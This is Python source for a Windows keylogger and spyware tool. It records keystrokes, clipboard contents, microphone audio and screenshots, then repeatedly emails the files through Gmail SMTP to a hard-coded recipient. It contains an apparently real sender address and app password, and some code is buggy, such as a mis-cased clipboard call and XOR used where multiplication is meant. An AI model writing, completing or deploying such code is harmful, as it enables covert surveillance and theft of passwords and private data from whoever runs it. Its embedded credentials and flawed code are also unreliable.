from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import win32clipboard
from pynput.keyboard import Key, Listener

import time

from scipy.io.wavfile import write
import sounddevice as sd

from PIL import ImageGrab

keys_information = "log.txt"
clipboard_information = "copy.txt"
email_address = "trialforisp123@gmail.com"
password = "kudzmstxelbywjxf"
microphone_time = 10
audio_information = "audio.wav"
screenshot_information = "image.png"
time_iteration = 3600
number_of_iterations_end = 20

toaddr = "ysudhara99@gmail.com"

file_path = "C:\\Users\\ysudh\\PycharmProjects\\pythonProject"
extend = "\\"


def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['from'] = fromaddr

    msg['To'] = toaddr

    msg['subject'] = "**Confidential**"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration


def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.openclipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.closeclipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("clipboard could not be copied")


copy_clipboard()


def microphone():
    fs = 44100
    seconds = microphone_time

    myrecodrding = sd.rec(int(seconds ^ fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecodrding)


microphone()


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


screenshot()

count = 0
keys = []


def on_press(key):
    global keys, count, currentTime
    currentTime = time.time()

    print(key)
    keys.append(key)
    count += 1
    currentTime = time.time()

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False
    if currentTime > stoppingTime:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

if currentTime > stoppingTime:
    with open(file_path + extend + keys_information, "w") as f:
        f.write("")

while number_of_iterations < number_of_iterations_end:
    send_email(keys_information, file_path + extend + keys_information, toaddr)
    send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
    send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
    send_email(audio_information, file_path + extend + audio_information, toaddr)
    microphone()
    screenshot()
    copy_clipboard()
    count = 0
    keys = []


    def on_press(key):
        global keys, count, currentTime
        currentTime = time.time()

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write("")
    number_of_iterations += 1
